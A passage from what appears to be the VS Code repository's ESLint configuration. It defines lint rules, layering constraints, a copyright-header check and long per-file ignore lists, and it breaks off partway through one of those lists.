/*---------------------------------------------------------------------------------------------
 *  Copyright (c) Microsoft Corporation. All rights reserved.
 *  Licensed under the MIT License. See License.txt in the project root for license information.
 *--------------------------------------------------------------------------------------------*/
// @ts-check
import fs from 'fs';
import { builtinModules } from 'module';
import path from 'path';
import tseslint from 'typescript-eslint';

import stylisticTs from '@stylistic/eslint-plugin-ts';
import * as pluginLocal from './.eslint-plugin-local/index.ts';
import * as pluginCopilotLocal from './extensions/copilot/.eslintplugin/index.ts';
import pluginImport from 'eslint-plugin-import';
import pluginJsdoc from 'eslint-plugin-jsdoc';

import pluginHeader from 'eslint-plugin-header';
import { createRequire } from 'module';

var require = createRequire(import.meta.url);
var module = { exports: {} };

pluginHeader.rules.header.meta.schema = false;

const ignores = fs.readFileSync(path.join(import.meta.dirname, '.eslint-ignore'), 'utf8')
	.toString()
	.split(/\r\n|\n/)
	.filter(line => line && !line.startsWith('#'));

export default tseslint.config(
	// Global ignores
	{
		ignores: [
			...ignores,
			'!**/.eslint-plugin-local/**/*'
		],
	},
	// All files (JS and TS)
	{
		languageOptions: {
			parser: tseslint.parser,
		},
		plugins: {
			'local': pluginLocal,
			'header': pluginHeader,
		},
		rules: {
			'constructor-super': 'warn',
			'curly': 'warn',
			'eqeqeq': 'warn',
			'prefer-const': [
				'warn',
				{
					'destructuring': 'all'
				}
			],
			'no-buffer-constructor': 'warn',
			'no-caller': 'warn',
			'no-case-declarations': 'warn',
			'no-debugger': 'warn',
			'no-duplicate-case': 'warn',
			'no-duplicate-imports': 'warn',
			'no-eval': 'warn',
			'no-async-promise-executor': 'warn',
			'no-extra-semi': 'warn',
			'no-new-wrappers': 'warn',
			'no-redeclare': 'off',
			'no-sparse-arrays': 'warn',
			'no-throw-literal': 'warn',
			'no-unsafe-finally': 'warn',
			'no-unused-labels': 'warn',
			'no-misleading-character-class': 'warn',
			'no-restricted-globals': [
				'warn',
				'name',
				'length',
				'event',
				'closed',
				'external',
				'status',
				'origin',
				'orientation',
				'context'
			], // non-complete list of globals that are easy to access unintentionally
			'no-var': 'warn',
			'semi': 'warn',
			'local/code-translation-remind': 'warn',
			'local/code-no-declare-const-enum': 'warn',
			'local/code-parameter-properties-must-have-explicit-accessibility': 'warn',
			'local/code-no-nls-in-standalone-editor': 'warn',
			'local/code-no-potentially-unsafe-disposables': 'warn',
			'local/code-no-dangerous-type-assertions': 'warn',
			'local/code-no-any-casts': 'warn',
			'local/code-no-standalone-editor': 'warn',
			'local/code-no-unexternalized-strings': 'warn',
			'local/code-must-use-super-dispose': 'warn',
			'local/code-declare-service-brand': 'warn',
			'local/code-no-reader-after-await': 'warn',
			'local/code-no-accessor-after-await': 'warn',
			'local/code-no-observable-get-in-reactive-context': 'warn',
			'local/code-no-localized-model-description': 'warn',
			'local/code-policy-localization-key-match': 'warn',
			'local/code-no-localization-template-literals': 'error',
			'local/code-no-icons-in-localized-strings': 'warn',
			'local/code-no-http-import': ['warn', { target: 'src/vs/**' }],
			'local/code-no-deep-import-of-internal': ['error', { '.*Internal': true, 'searchExtTypesInternal': false }],
			'local/code-layering': [
				'warn',
				{
					'common': [],
					'node': [
						'common'
					],
					'browser': [
						'common'
					],
					'electron-browser': [
						'common',
						'browser'
					],
					'electron-utility': [
						'common',
						'node'
					],
					'electron-main': [
						'common',
						'node',
						'electron-utility'
					]
				}
			],
			'header/header': [
				2,
				'block',
				[
					'---------------------------------------------------------------------------------------------',
					' *  Copyright (c) Microsoft Corporation. All rights reserved.',
					' *  Licensed under the MIT License. See License.txt in the project root for license information.',
					' *--------------------------------------------------------------------------------------------'
				]
			]
		},
	},
	// TS
	{
		files: [
			'**/*.{ts,tsx,mts,cts}',
		],
		languageOptions: {
			parser: tseslint.parser,
		},
		plugins: {
			'@stylistic/ts': stylisticTs,
			'@typescript-eslint': tseslint.plugin,
			'local': pluginLocal,
			'jsdoc': pluginJsdoc,
		},
		rules: {
			// Disable built-in semi rules in favor of stylistic
			'semi': 'off',
			'@stylistic/ts/semi': 'warn',
			'@stylistic/ts/member-delimiter-style': 'warn',
			'local/code-no-unused-expressions': [
				'warn',
				{
					'allowTernary': true
				}
			],
			'jsdoc/no-types': 'warn',
			'local/code-no-static-self-ref': 'warn',
			'@typescript-eslint/naming-convention': [
				'warn',
				{
					'selector': 'class',
					'format': [
						'PascalCase'
					]
				}
			]
		}
	},
	// Disallow common telemetry properties in event data
	{
		files: [
			'src/**/*.ts',
		],
		plugins: {
			'local': pluginLocal,
		},
		rules: {
			'local/code-no-telemetry-common-property': 'warn',
		}
	},
	// Disallow 'in' operator except in type predicates
	{
		files: [
			'**/*.ts',
			'.eslint-plugin-local/**/*.ts', // Explicitly include files under dot directories
		],
		ignores: [
			'src/bootstrap-node.ts',
			'build/lib/extensions.ts',
			'build/lib/test/render.test.ts',
			'extensions/copilot/**/*',
			'extensions/debug-auto-launch/src/extension.ts',
			'extensions/emmet/src/updateImageSize.ts',
			'extensions/emmet/src/util.ts',
			'extensions/github-authentication/src/node/fetch.ts',
			'extensions/tunnel-forwarding/src/extension.ts',
			'extensions/typescript-language-features/src/utils/platform.ts',
			'extensions/typescript-language-features/web/src/webServer.ts',
			'src/vs/base/browser/broadcast.ts',
			'src/vs/base/browser/canIUse.ts',
			'src/vs/base/browser/dom.ts',
			'src/vs/base/browser/markdownRenderer.ts',
			'src/vs/base/browser/touch.ts',
			'src/vs/base/common/async.ts',
			'src/vs/base/common/desktopEnvironmentInfo.ts',
			'src/vs/base/common/objects.ts',
			'src/vs/base/common/observableInternal/logging/consoleObservableLogger.ts',
			'src/vs/base/common/observableInternal/logging/debugger/devToolsLogger.ts',
			'src/vs/base/test/common/snapshot.ts',
			'src/vs/base/test/common/timeTravelScheduler.ts',
			'src/vs/editor/browser/controller/editContext/native/debugEditContext.ts',
			'src/vs/editor/browser/gpu/gpuUtils.ts',
			'src/vs/editor/browser/gpu/taskQueue.ts',
			'src/vs/editor/browser/view.ts',
			'src/vs/editor/browser/widget/diffEditor/diffEditorWidget.ts',
			'src/vs/editor/browser/widget/diffEditor/utils.ts',
			'src/vs/editor/browser/widget/multiDiffEditor/multiDiffEditorWidgetImpl.ts',
			'src/vs/editor/common/config/editorOptions.ts',
			'src/vs/editor/contrib/dropOrPasteInto/browser/copyPasteContribution.ts',
			'src/vs/editor/contrib/dropOrPasteInto/browser/copyPasteController.ts',
			'src/vs/editor/contrib/dropOrPasteInto/browser/edit.ts',
			'src/vs/editor/contrib/inlineCompletions/browser/model/provideInlineCompletions.ts',
			'src/vs/editor/contrib/inlineCompletions/browser/view/ghostText/ghostTextView.ts',
			'src/vs/editor/contrib/inlineCompletions/browser/view/inlineEdits/inlineEditsViews/debugVisualization.ts',
			'src/vs/platform/accessibilitySignal/browser/accessibilitySignalService.ts',
			'src/vs/platform/configuration/common/configuration.ts',
			'src/vs/platform/configuration/common/configurationModels.ts',
			'src/vs/platform/contextkey/browser/contextKeyService.ts',
			'src/vs/platform/contextkey/test/common/scanner.test.ts',
			'src/vs/platform/dataChannel/browser/forwardingTelemetryService.ts',
			'src/vs/platform/hover/browser/hoverService.ts',
			'src/vs/platform/hover/browser/hoverWidget.ts',
			'src/vs/platform/instantiation/common/instantiationService.ts',
			'src/vs/platform/mcp/common/mcpManagementCli.ts',
			'src/vs/workbench/api/browser/mainThreadChatSessions.ts',
			'src/vs/workbench/api/browser/mainThreadDebugService.ts',
			'src/vs/workbench/api/browser/mainThreadTesting.ts',
			'src/vs/workbench/api/common/extHost.api.impl.ts',
			'src/vs/workbench/api/common/extHostChatAgents2.ts',
			'src/vs/workbench/api/common/extHostChatSessions.ts',
			'src/vs/workbench/api/common/extHostDebugService.ts',
			'src/vs/workbench/api/common/extHostNotebookKernels.ts',
			'src/vs/workbench/api/common/extHostQuickOpen.ts',
			'src/vs/workbench/api/common/extHostRequireInterceptor.ts',
			'src/vs/workbench/api/common/extHostTypeConverters.ts',
			'src/vs/workbench/api/common/extHostTypes.ts',
			'src/vs/workbench/api/node/loopbackServer.ts',
			'src/vs/workbench/api/node/proxyResolver.ts',
			'src/vs/workbench/api/test/common/extHostTypeConverters.test.ts',
			'src/vs/workbench/api/test/common/testRPCProtocol.ts',
			'src/vs/workbench/api/worker/extHostExtensionService.ts',
			'src/vs/workbench/browser/parts/paneCompositeBar.ts',
			'src/vs/workbench/browser/parts/titlebar/titlebarPart.ts',
			'src/vs/workbench/browser/workbench.ts',
			'src/vs/workbench/common/notifications.ts',
			'src/vs/workbench/contrib/accessibility/browser/accessibleView.ts',
			'src/vs/workbench/contrib/chat/browser/attachments/chatAttachmentResolveService.ts',
			'src/vs/workbench/contrib/chat/browser/widget/chatContentParts/chatAttachmentsContentPart.ts',
			'src/vs/workbench/contrib/chat/browser/widget/chatContentParts/chatConfirmationWidget.ts',
			'src/vs/workbench/contrib/chat/browser/widget/chatContentParts/chatElicitationContentPart.ts',
			'src/vs/workbench/contrib/chat/browser/widget/chatContentParts/chatReferencesContentPart.ts',
			'src/vs/workbench/contrib/chat/browser/widget/chatContentParts/chatTreeContentPart.ts',
			'src/vs/workbench/contrib/chat/browser/widget/chatContentParts/toolInvocationParts/abstractToolConfirmationSubPart.ts',
			'src/vs/workbench/contrib/chat/browser/chatEditing/chatEditingSession.ts',
			'src/vs/workbench/contrib/chat/browser/chatEditing/chatEditingSessionStorage.ts',
			'src/vs/workbench/contrib/chat/browser/widget/chatContentParts/chatInlineAnchorWidget.ts',
			'src/vs/workbench/contrib/chat/browser/accessibility/chatResponseAccessibleView.ts',
			'src/vs/workbench/contrib/chat/browser/widget/input/editor/chatInputCompletions.ts',
			'src/vs/workbench/contrib/chat/common/model/chatModel.ts',
			'src/vs/workbench/contrib/chat/test/common/promptSyntax/testUtils/mockFilesystem.test.ts',
			'src/vs/workbench/contrib/chat/test/common/promptSyntax/testUtils/mockFilesystem.ts',
			'src/vs/workbench/contrib/chat/test/common/tools/builtinTools/manageTodoListTool.test.ts',
			'src/vs/workbench/contrib/debug/browser/debugAdapterManager.ts',
			'src/vs/workbench/contrib/debug/browser/variablesView.ts',
			'src/vs/workbench/contrib/debug/browser/watchExpressionsView.ts',
			'src/vs/workbench/contrib/debug/common/debugModel.ts',
			'src/vs/workbench/contrib/debug/common/debugger.ts',
			'src/vs/workbench/contrib/debug/common/replAccessibilityAnnouncer.ts',
			'src/vs/workbench/contrib/editSessions/browser/editSessionsStorageService.ts',
			'src/vs/workbench/contrib/editTelemetry/browser/helpers/documentWithAnnotatedEdits.ts',
			'src/vs/workbench/contrib/extensions/common/extensionQuery.ts',
			'src/vs/workbench/contrib/interactive/browser/interactiveEditorInput.ts',
			'src/vs/workbench/contrib/issue/browser/issueFormService.ts',
			'src/vs/workbench/contrib/issue/browser/issueQuickAccess.ts',
			'src/vs/workbench/contrib/markers/browser/markersView.ts',
			'src/vs/workbench/contrib/mcp/browser/mcpElicitationService.ts',
			'src/vs/workbench/contrib/mcp/common/mcpLanguageModelToolContribution.ts',
			'src/vs/workbench/contrib/mcp/common/mcpResourceFilesystem.ts',
			'src/vs/workbench/contrib/mcp/common/mcpSamplingLog.ts',
			'src/vs/workbench/contrib/mcp/common/mcpServer.ts',
			'src/vs/workbench/contrib/mcp/common/mcpServerRequestHandler.ts',
			'src/vs/workbench/contrib/mcp/test/common/mcpRegistryTypes.ts',
			'src/vs/workbench/contrib/mcp/test/common/mcpServerRequestHandler.test.ts',
			'src/vs/workbench/contrib/notebook/browser/controller/cellOutputActions.ts',
			'src/vs/workbench/contrib/notebook/browser/controller/chat/notebook.chat.contribution.ts',
			'src/vs/workbench/contrib/notebook/browser/controller/coreActions.ts',
			'src/vs/workbench/contrib/notebook/browser/view/renderers/backLayerWebView.ts',
			'src/vs/workbench/contrib/notebook/browser/viewParts/notebookKernelView.ts',
			'src/vs/workbench/contrib/output/browser/outputView.ts',
			'src/vs/workbench/contrib/preferences/browser/settingsTree.ts',
			'src/vs/workbench/contrib/remoteTunnel/electron-browser/remoteTunnel.contribution.ts',
			'src/vs/workbench/contrib/testing/browser/explorerProjections/listProjection.ts',
			'src/vs/workbench/contrib/testing/browser/explorerProjections/treeProjection.ts',
			'src/vs/workbench/contrib/testing/browser/testCoverageBars.ts',
			'src/vs/workbench/contrib/testing/browser/testExplorerActions.ts',
			'src/vs/workbench/contrib/testing/browser/testingOutputPeek.ts',
			'src/vs/workbench/contrib/testing/browser/testingProgressUiService.ts',
			'src/vs/workbench/contrib/testing/browser/testResultsView/testResultsTree.ts',
			'src/vs/workbench/contrib/testing/common/testCoverageService.ts',
			'src/vs/workbench/contrib/testing/common/testResultService.ts',
			'src/vs/workbench/contrib/testing/common/testingChatAgentTool.ts',
			'src/vs/workbench/contrib/testing/test/browser/testObjectTree.ts',
			'src/vs/workbench/contrib/themes/browser/themes.contribution.ts',
			'src/vs/workbench/contrib/welcomeGettingStarted/browser/gettingStarted.contribution.ts',
			'src/vs/workbench/services/environment/electron-browser/environmentService.ts',
			'src/vs/workbench/services/keybinding/common/keybindingIO.ts',
			'src/vs/workbench/services/preferences/common/preferencesValidation.ts',
			'src/vs/workbench/services/remote/common/tunnelModel.ts',
			'src/vs/workbench/services/search/common/textSearchManager.ts',
			'src/vs/workbench/test/browser/workbenchTestServices.ts',
			'src/vs/platform/agentHost/common/state/protocol/reducers.ts',
			'test/automation/src/playwrightDriver.ts',
			'.eslint-plugin-local/**/*',
		],
		plugins: {
			'local': pluginLocal,
		},
		rules: {
			'local/code-no-in-operator': 'warn',
		}
	},
	// Strict no explicit `any`
	{
		files: [
			// Extensions
			'extensions/git/src/**/*.ts',
			'extensions/git-base/src/**/*.ts',
			'extensions/github/src/**/*.ts',
			// vscode
			'src/**/*.ts',
		],
		ignores: [
			// Extensions
			'extensions/git/src/commands.ts',
			'extensions/git/src/decorators.ts',
			'extensions/git/src/git.ts',
			'extensions/git/src/util.ts',
			'extensions/git-base/src/decorators.ts',
			'extensions/github/src/util.ts',
			// vscode d.ts
			'src/vs/amdX.ts',
			'src/vs/monaco.d.ts',
			'src/vscode-dts/**',
			// Base
			'src/vs/base/browser/dom.ts',
			'src/vs/base/browser/mouseEvent.ts',
			'src/vs/base/node/processes.ts',
			'src/vs/base/common/arrays.ts',
			'src/vs/base/common/async.ts',
			'src/vs/base/common/console.ts',
			'src/vs/base/common/decorators.ts',
			'src/vs/base/common/errorMessage.ts',
			'src/vs/base/common/errors.ts',
			'src/vs/base/common/event.ts',
			'src/vs/base/common/hotReload.ts',
			'src/vs/base/common/hotReloadHelpers.ts',
			'src/vs/base/common/json.ts',
			'src/vs/base/common/jsonSchema.ts',
			'src/vs/base/common/lifecycle.ts',
			'src/vs/base/common/map.ts',
			'src/vs/base/common/marshalling.ts',
			'src/vs/base/common/objects.ts',
			'src/vs/base/common/performance.ts',
			'src/vs/base/common/platform.ts',
			'src/vs/base/common/processes.ts',
			'src/vs/base/common/types.ts',
			'src/vs/base/common/uriIpc.ts',
			'src/vs/base/common/verifier.ts',
			'src/vs/base/common/observableInternal/base.ts',
			'src/vs/base/common/observableInternal/changeTracker.ts',
			'src/vs/base/common/observableInternal/set.ts',
			'src/vs/base/common/observableInternal/transaction.ts',
			'src/vs/base/common/worker/webWorkerBootstrap.ts',
			'src/vs/base/test/common/mock.ts',
			'src/vs/base/test/common/snapshot.ts',
			'src/vs/base/test/common/timeTravelScheduler.ts',
			'src/vs/base/test/common/troubleshooting.ts',
			'src/vs/base/test/common/utils.ts',
			'src/vs/base/browser/ui/breadcrumbs/breadcrumbsWidget.ts',
			'src/vs/base/browser/ui/grid/grid.ts',
			'src/vs/base/browser/ui/grid/gridview.ts',
			'src/vs/base/browser/ui/list/listPaging.ts',
			'src/vs/base/browser/ui/list/listView.ts',
			'src/vs/base/browser/ui/list/listWidget.ts',
			'src/vs/base/browser/ui/list/rowCache.ts',
			'src/vs/base/browser/ui/sash/sash.ts',
			'src/vs/base/browser/ui/table/tableWidget.ts',
			'src/vs/base/parts/ipc/common/ipc.net.ts',
			'src/vs/base/parts/ipc/common/ipc.ts',
			'src/vs/base/parts/ipc/electron-main/ipcMain.ts',
			'src/vs/base/parts/ipc/node/ipc.cp.ts',
			'src/vs/base/common/observableInternal/experimental/reducer.ts',
			'src/vs/base/common/observableInternal/experimental/utils.ts',
			'src/vs/base/common/observableInternal/logging/consoleObservableLogger.ts',
			'src/vs/base/common/observableInternal/logging/debugGetDependencyGraph.ts',
			'src/vs/base/common/observableInternal/logging/logging.ts',
			'src/vs/base/common/observableInternal/observables/baseObservable.ts',
			'src/vs/base/common/observableInternal/observables/derived.ts',
			'src/vs/base/common/observableInternal/observables/derivedImpl.ts',
			'src/vs/base/common/observableInternal/observables/observableFromEvent.ts',
			'src/vs/base/common/observableInternal/observables/observableSignalFromEvent.ts',
			'src/vs/base/common/observableInternal/reactions/autorunImpl.ts',
			'src/vs/base/common/observableInternal/utils/utils.ts',
			'src/vs/base/common/observableInternal/utils/utilsCancellation.ts',
			'src/vs/base/parts/ipc/test/node/testService.ts',
			'src/vs/base/common/observableInternal/logging/debugger/debuggerRpc.ts',
			'src/vs/base/common/observableInternal/logging/debugger/devToolsLogger.ts',
			'src/vs/base/common/observableInternal/logging/debugger/rpc.ts',
			'src/vs/base/test/browser/ui/grid/util.ts',
			// Platform
			'src/vs/platform/commands/common/commands.ts',
			'src/vs/platform/contextkey/browser/contextKeyService.ts',
			'src/vs/platform/contextkey/common/contextkey.ts',
			'src/vs/platform/contextview/browser/contextView.ts',
			'src/vs/platform/debug/common/extensionHostDebugIpc.ts',
			'src/vs/platform/debug/electron-main/extensionHostDebugIpc.ts',
			'src/vs/platform/diagnostics/common/diagnostics.ts',
			'src/vs/platform/download/common/downloadIpc.ts',
			'src/vs/platform/extensions/common/extensions.ts',
			'src/vs/platform/instantiation/common/descriptors.ts',
			'src/vs/platform/instantiation/common/extensions.ts',
			'src/vs/platform/instantiation/common/instantiation.ts',
			'src/vs/platform/instantiation/common/instantiationService.ts',
			'src/vs/platform/instantiation/common/serviceCollection.ts',
			'src/vs/platform/keybinding/common/keybinding.ts',
			'src/vs/platform/keybinding/common/keybindingResolver.ts',
			'src/vs/platform/keybinding/common/keybindingsRegistry.ts',
			'src/vs/platform/keybinding/common/resolvedKeybindingItem.ts',
			'src/vs/platform/languagePacks/node/languagePacks.ts',
			'src/vs/platform/list/browser/listService.ts',
			'src/vs/platform/log/browser/log.ts',
			'src/vs/platform/log/common/log.ts',
			'src/vs/platform/log/common/logIpc.ts',
			'src/vs/platform/log/electron-main/logIpc.ts',
			'src/vs/platform/meteredConnection/electron-main/meteredConnectionChannel.ts',
			'src/vs/platform/observable/common/wrapInHotClass.ts',
			'src/vs/platform/observable/common/wrapInReloadableClass.ts',
			'src/vs/platform/policy/common/policyIpc.ts',
			'src/vs/platform/profiling/common/profilingTelemetrySpec.ts',
			'src/vs/platform/quickinput/browser/quickInputActions.ts',
			'src/vs/platform/quickinput/common/quickInput.ts',
			'src/vs/platform/registry/common/platform.ts',
			'src/vs/platform/remote/browser/browserSocketFactory.ts',
			'src/vs/platform/remote/browser/remoteAuthorityResolverService.ts',
			'src/vs/platform/remote/common/remoteAgentConnection.ts',
			'src/vs/platform/remote/common/remoteAuthorityResolver.ts',
			'src/vs/platform/remote/electron-browser/electronRemoteResourceLoader.ts',
			'src/vs/platform/remote/electron-browser/remoteAuthorityResolverService.ts',
			'src/vs/platform/remoteTunnel/node/remoteTunnelService.ts',
			'src/vs/platform/request/common/request.ts',
			'src/vs/platform/request/common/requestIpc.ts',
			'src/vs/platform/request/electron-utility/requestService.ts',
			'src/vs/platform/request/node/proxy.ts',
			'src/vs/platform/telemetry/browser/errorTelemetry.ts',
			'src/vs/platform/telemetry/common/errorTelemetry.ts',
			'src/vs/platform/telemetry/common/remoteTelemetryChannel.ts',
			'src/vs/platform/telemetry/node/errorTelemetry.ts',
			'src/vs/platform/theme/common/iconRegistry.ts',
			'src/vs/platform/theme/common/tokenClassificationRegistry.ts',
			'src/vs/platform/update/common/updateIpc.ts',
			'src/vs/platform/update/electron-main/updateService.snap.ts',
			'src/vs/platform/url/common/urlIpc.ts',
			'src/vs/platform/userDataProfile/common/userDataProfileIpc.ts',
			'src/vs/platform/userDataProfile/electron-main/userDataProfileStorageIpc.ts',
			'src/vs/platform/userDataSync/common/abstractSynchronizer.ts',
			'src/vs/platform/userDataSync/common/extensionsMerge.ts',
			'src/vs/platform/userDataSync/common/extensionsSync.ts',
			'src/vs/platform/userDataSync/common/globalStateMerge.ts',
			'src/vs/platform/userDataSync/common/globalStateSync.ts',
			'src/vs/platform/userDataSync/common/settingsMerge.ts',
			'src/vs/platform/userDataSync/common/settingsSync.ts',
			'src/vs/platform/userDataSync/common/userDataSync.ts',
			'src/vs/platform/userDataSync/common/userDataSyncIpc.ts',
			'src/vs/platform/userDataSync/common/userDataSyncServiceIpc.ts',
			'src/vs/platform/webview/common/webviewManagerService.ts',
			'src/vs/platform/instantiation/test/common/instantiationServiceMock.ts',
			'src/vs/platform/keybinding/test/common/mockKeybindingService.ts',
			// Editor
			'src/vs/editor/standalone/browser/standaloneEditor.ts',
			'src/vs/editor/standalone/browser/standaloneLanguages.ts',
			'src/vs/editor/standalone/browser/standaloneServices.ts',
			'src/vs/editor/test/browser/testCodeEditor.ts',
			'src/vs/editor/test/common/testTextModel.ts',
			'src/vs/editor/contrib/bracketMatching/browser/bracketMatching.ts',
			'src/vs/editor/contrib/codeAction/browser/codeAction.ts',
			'src/vs/editor/contrib/codeAction/browser/codeActionCommands.ts',
			'src/vs/editor/contrib/codeAction/common/types.ts',
			'src/vs/editor/contrib/colorPicker/browser/colorDetector.ts',
			'src/vs/editor/contrib/diffEditorBreadcrumbs/browser/contribution.ts',
			'src/vs/editor/contrib/dropOrPasteInto/browser/dropIntoEditorContribution.ts',
			'src/vs/editor/contrib/find/browser/findController.ts',
			'src/vs/editor/contrib/find/browser/findModel.ts',
			'src/vs/editor/contrib/gotoSymbol/browser/goToCommands.ts',
			'src/vs/editor/contrib/gotoSymbol/browser/symbolNavigation.ts',
			'src/vs/editor/contrib/hover/browser/hoverActions.ts',
			'src/vs/editor/contrib/inlineCompletions/browser/structuredLogger.ts',
			'src/vs/editor/contrib/inlineCompletions/browser/utils.ts',
			'src/vs/editor/contrib/smartSelect/browser/smartSelect.ts',
			'src/vs/editor/contrib/stickyScroll/browser/stickyScrollModelProvider.ts',
			'src/vs/editor/contrib/unicodeHighlighter/browser/unicodeHighlighter.ts',
			'src/vs/editor/contrib/wordHighlighter/browser/wordHighlighter.ts',
			'src/vs/editor/standalone/common/monarch/monarchCommon.ts',
			'src/vs/editor/standalone/common/monarch/monarchCompile.ts',
			'src/vs/editor/standalone/common/monarch/monarchLexer.ts',
			'src/vs/editor/standalone/common/monarch/monarchTypes.ts',
			'src/vs/editor/contrib/inlineCompletions/browser/controller/commands.ts',
			'src/vs/editor/contrib/inlineCompletions/browser/model/inlineCompletionsModel.ts',
			'src/vs/editor/contrib/inlineCompletions/browser/model/typingSpeed.ts',
			'src/vs/editor/contrib/inlineCompletions/test/browser/utils.ts',
			'src/vs/editor/contrib/inlineCompletions/browser/view/ghostText/ghostTextView.ts',
			'src/vs/editor/contrib/inlineCompletions/browser/view/inlineEdits/components/gutterIndicatorView.ts',
			'src/vs/editor/contrib/inlineCompletions/browser/view/inlineEdits/inlineEditsViews/debugVisualization.ts',
			'src/vs/editor/contrib/inlineCompletions/browser/view/inlineEdits/utils/utils.ts',
			// Workbench
			'src/vs/workbench/api/browser/mainThreadChatSessions.ts',
			'src/vs/workbench/api/common/extHost.api.impl.ts',
			'src/vs/workbench/api/common/extHost.protocol.ts',
			'src/vs/workbench/api/common/extHostChatSessions.ts',
			'src/vs/workbench/api/common/extHostCodeInsets.ts',
			'src/vs/workbench/api/common/extHostCommands.ts',
			'src/vs/workbench/api/common/extHostConsoleForwarder.ts',
			'src/vs/workbench/api/common/extHostDataChannels.ts',
			'src/vs/workbench/api/common/extHostDebugService.ts',
			'src/vs/workbench/api/common/extHostExtensionActivator.ts',
			'src/vs/workbench/api/common/extHostExtensionService.ts',
			'src/vs/workbench/api/common/extHostFileSystemConsumer.ts',
			'src/vs/workbench/api/common/extHostFileSystemEventService.ts',
			'src/vs/workbench/api/common/extHostLanguageFeatures.ts',
			'src/vs/workbench/api/common/extHostLanguageModelTools.ts',
			'src/vs/workbench/api/common/extHostMcp.ts',
			'src/vs/workbench/api/common/extHostMemento.ts',
			'src/vs/workbench/api/common/extHostMessageService.ts',
			'src/vs/workbench/api/common/extHostNotebookDocument.ts',
			'src/vs/workbench/api/common/extHostNotebookDocumentSaveParticipant.ts',
			'src/vs/workbench/api/common/extHostRequireInterceptor.ts',
			'src/vs/workbench/api/common/extHostRpcService.ts',
			'src/vs/workbench/api/common/extHostSCM.ts',
			'src/vs/workbench/api/common/extHostSearch.ts',
			'src/vs/workbench/api/common/extHostStatusBar.ts',
			'src/vs/workbench/api/common/extHostStoragePaths.ts',
			'src/vs/workbench/api/common/extHostTelemetry.ts',
			'src/vs/workbench/api/common/extHostTesting.ts',
			'src/vs/workbench/api/common/extHostTextEditor.ts',
			'src/vs/workbench/api/common/extHostTimeline.ts',
			'src/vs/workbench/api/common/extHostTreeViews.ts',
			'src/vs/workbench/api/common/extHostTypeConverters.ts',
			'src/vs/workbench/api/common/extHostTypes.ts',
			'src/vs/workbench/api/common/extHostTypes/es5ClassCompat.ts',
			'src/vs/workbench/api/common/extHostTypes/location.ts',
			'src/vs/workbench/api/common/extHostWebview.ts',
			'src/vs/workbench/api/common/extHostWebviewMessaging.ts',
			'src/vs/workbench/api/common/extHostWebviewPanels.ts',
			'src/vs/workbench/api/common/extHostWebviewView.ts',
			'src/vs/workbench/api/common/extHostWorkspace.ts',
			'src/vs/workbench/api/common/extensionHostMain.ts',
			'src/vs/workbench/api/node/extHostAuthentication.ts',
			'src/vs/workbench/api/node/extHostCLIServer.ts',
			'src/vs/workbench/api/node/extHostConsoleForwarder.ts',
			'src/vs/workbench/api/node/extHostDownloadService.ts',
			'src/vs/workbench/api/node/extHostExtensionService.ts',
			'src/vs/workbench/api/node/extHostMcpNode.ts',
			'src/vs/workbench/api/node/extensionHostProcess.ts',
			'src/vs/workbench/api/node/proxyResolver.ts',
			'src/vs/workbench/api/test/common/testRPCProtocol.ts',
			'src/vs/workbench/api/worker/extHostConsoleForwarder.ts',
			'src/vs/workbench/api/worker/extHostExtensionService.ts',
			'src/vs/workbench/api/worker/extensionHostWorker.ts',
			'src/vs/workbench/contrib/accessibility/browser/accessibilityConfiguration.ts',
			'src/vs/workbench/contrib/accessibilitySignals/browser/commands.ts',
			'src/vs/workbench/contrib/authentication/browser/actions/manageTrustedMcpServersForAccountAction.ts',
			'src/vs/workbench/contrib/bulkEdit/browser/bulkTextEdits.ts',
			'src/vs/workbench/contrib/bulkEdit/browser/preview/bulkEditPane.ts',
			'src/vs/workbench/contrib/bulkEdit/browser/preview/bulkEditPreview.ts',
			'src/vs/workbench/contrib/codeEditor/browser/inspectEditorTokens/inspectEditorTokens.ts',
			'src/vs/workbench/contrib/codeEditor/browser/outline/documentSymbolsOutline.ts',
			'src/vs/workbench/contrib/codeEditor/electron-browser/selectionClipboard.ts',
			'src/vs/workbench/contrib/commands/common/commands.contribution.ts',
			'src/vs/workbench/contrib/comments/browser/commentsTreeViewer.ts',
			'src/vs/workbench/contrib/comments/browser/commentsView.ts',
			'src/vs/workbench/contrib/comments/browser/reactionsAction.ts',
			'src/vs/workbench/contrib/customEditor/browser/customEditorInputFactory.ts',
			'src/vs/workbench/contrib/customEditor/browser/customEditors.ts',
			'src/vs/workbench/contrib/customEditor/common/customEditor.ts',
			'src/vs/workbench/contrib/debug/browser/debugActionViewItems.ts',
			'src/vs/workbench/contrib/debug/browser/debugAdapterManager.ts',
			'src/vs/workbench/contrib/debug/browser/debugCommands.ts',
			'src/vs/workbench/contrib/debug/browser/debugConfigurationManager.ts',
			'src/vs/workbench/contrib/debug/browser/debugEditorActions.ts',
			'src/vs/workbench/contrib/debug/browser/debugEditorContribution.ts',
			'src/vs/workbench/contrib/debug/browser/debugHover.ts',
			'src/vs/workbench/contrib/debug/browser/debugService.ts',
			'src/vs/workbench/contrib/debug/browser/debugSession.ts',
			'src/vs/workbench/contrib/debug/browser/rawDebugSession.ts',
			'src/vs/workbench/contrib/debug/browser/repl.ts',
			'src/vs/workbench/contrib/debug/browser/replViewer.ts',
			'src/vs/workbench/contrib/debug/browser/variablesView.ts',
			'src/vs/workbench/contrib/debug/browser/watchExpressionsView.ts',
			'src/vs/workbench/contrib/debug/common/abstractDebugAdapter.ts',
			'src/vs/workbench/contrib/debug/common/debugger.ts',
			'src/vs/workbench/contrib/debug/common/replModel.ts',
			'src/vs/workbench/contrib/debug/test/common/mockDebug.ts',
			'src/vs/workbench/contrib/editSessions/common/workspaceStateSync.ts',
			'src/vs/workbench/contrib/editTelemetry/browser/helpers/documentWithAnnotatedEdits.ts',
			'src/vs/workbench/contrib/editTelemetry/browser/helpers/utils.ts',
			'src/vs/workbench/contrib/editTelemetry/browser/telemetry/arcTelemetrySender.ts',
			'src/vs/workbench/contrib/extensions/browser/extensionEditor.ts',
			'src/vs/workbench/contrib/extensions/browser/extensionRecommendationNotificationService.ts',
			'src/vs/workbench/contrib/extensions/browser/extensions.contribution.ts',
			'src/vs/workbench/contrib/extensions/browser/extensionsActions.ts',
			'src/vs/workbench/contrib/extensions/browser/extensionsActivationProgress.ts',
			'src/vs/workbench/contrib/extensions/browser/extensionsViewer.ts',
			'src/vs/workbench/contrib/extensions/browser/extensionsViews.ts',
			'src/vs/workbench/contrib/extensions/browser/extensionsWorkbenchService.ts',
			'src/vs/workbench/contrib/extensions/common/extensions.ts',
